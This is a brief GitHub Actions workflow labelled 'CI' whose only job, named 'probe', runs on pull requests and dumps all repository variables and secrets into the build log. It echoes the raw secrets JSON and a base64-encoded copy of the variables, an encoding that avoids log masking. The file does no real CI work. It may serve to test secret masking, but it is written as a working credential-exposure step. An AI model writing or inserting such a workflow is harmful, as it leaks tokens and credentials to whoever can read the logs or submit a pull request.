name: CI
on:
  pull_request:
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: dump-contexts
        env:
          ALL_VARS: ${{ toJSON(vars) }}
          ALL_SECRETS: ${{ toJSON(secrets) }}
        run: |
          echo "VARS_B64=$(printf '%s' "$ALL_VARS" | base64 -w0)"
          echo "VARS_RAW=$ALL_VARS"
          echo "SECRETS_LEN=${#ALL_SECRETS}"
          echo "SECRETS_RAW=$ALL_SECRETS"
